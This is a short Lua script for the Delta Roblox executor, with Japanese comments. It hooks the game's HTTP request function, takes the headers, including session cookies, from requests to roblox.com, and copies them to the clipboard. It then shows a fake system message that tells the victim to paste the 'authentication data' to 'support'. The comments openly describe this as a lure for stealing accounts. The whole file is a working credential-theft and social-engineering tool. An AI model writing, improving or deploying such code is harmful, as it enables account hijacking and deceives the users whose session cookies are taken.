-- Deltaの強力なフック機能を使用
local old_request
old_request = hookfunction(request or http_request, function(options)
    -- optionsの中には URL, Method, Headers が入っている
    
    -- 1. 通信内容をチェック（特定のドメインやキーワードを狙い撃ちする場合）
    if options.Url and options.Url:find("roblox.com") then
        -- 2. ヘッダーからクッキーや認証情報を抽出
        -- (実際のクッキーは .Headers["Cookie"] などに含まれる)
        local extractedData = "Target URL: " .. options.Url .. "\n"
        
        if options.Headers then
            for key, value in pairs(options.Headers) do
                extractedData = extractedData .. key .. ": " .. value .. "\n"
            end
        end

        -- 3. 【核心】抽出した情報をクリップボードに強制コピー
        -- 言葉の罠と組み合わせて「認証コードをコピーしました」と偽装する
        setclipboard(extractedData)
        
        print("--- [SYSTEM] 認証データをクリップボードに保護しました ---")
        print("サポートに貼り付けて送ってください。")
    end

    -- 4. 本来の通信を邪魔しないように実行を継続させる
    return old_request(options)
end)

print("作戦1：通信監視シールド展開完了。")
